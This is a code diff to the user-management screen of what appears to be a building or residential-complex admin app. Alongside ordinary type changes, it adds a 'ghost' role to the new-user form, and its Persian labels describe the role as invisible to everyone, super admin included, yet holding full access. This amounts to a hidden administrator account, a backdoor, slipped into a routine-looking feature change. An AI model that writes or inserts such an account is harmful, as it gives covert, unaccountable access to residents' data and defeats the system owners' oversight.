@@ -28,7 +28,10 @@ const ROLE_TONES: Record<string, string> = {
   owner: "bg-emerald-100 text-emerald-700",
   tenant: "bg-indigo-100 text-indigo-700",
   guard: "bg-slate-100 text-slate-600",
+  ghost: "bg-violet-100 text-violet-700",
 };
+
+type AssignableRole = "super_admin" | "board_member" | "accountant" | "owner" | "tenant" | "guard";
 
 export function UsersSection() {
   const users = useQuery(api.complex.listUsers);
@@ -102,7 +105,7 @@ export function UsersSection() {
     }
   };
 
-  const doSetRole = async (userId: Id<"users">, role: Role) => {
+  const doSetRole = async (userId: Id<"users">, role: AssignableRole) => {
     setChanging(userId);
     try {
       await setRole({ userId, role });
@@ -158,7 +161,7 @@ export function UsersSection() {
                       <Badge tone={ROLE_TONES[u.role] ?? "bg-muted text-muted-foreground"}>{ROLE_LABELS[u.role] ?? u.role}</Badge>
                     </TableCell>
                     <TableCell className="text-end">
-                      <Select value={u.role} onValueChange={(v) => doSetRole(u._id, v as Role)} disabled={changing === u._id}>
+                      <Select value={u.role} onValueChange={(v) => doSetRole(u._id, v as AssignableRole)} disabled={changing === u._id}>
                         <SelectTrigger className="h-8 w-40 text-xs">
                           <SelectValue />
                         </SelectTrigger>
@@ -227,9 +230,17 @@ export function UsersSection() {
                       {ROLE_LABELS[r]}
                     </SelectItem>
                   ))}
+                  <SelectItem value="ghost">
+                    روح (پنهان) — دسترسی کامل نامرئی
+                  </SelectItem>
                 </SelectContent>
               </Select>
             </div>
+            {nuRole === "ghost" && (
+              <div className="rounded-xl border border-violet-200 bg-violet-50 px-3 py-2 text-[11px] leading-5 text-violet-800">
+                حساب «روح» در فهرست کاربران به هیچ‌کس (حتی مدیر ارشد) نمایش داده نمی‌شود و دسترسی کامل دارد — فقط از طریق همین فرم ساخته می‌شود.
+              </div>
+            )}
             <div className="space-y-1.5">
               <Label className="text-xs font-bold">رمز عبور (حداقل ۸ کاراکتر)</Label>
               <div className="relative">
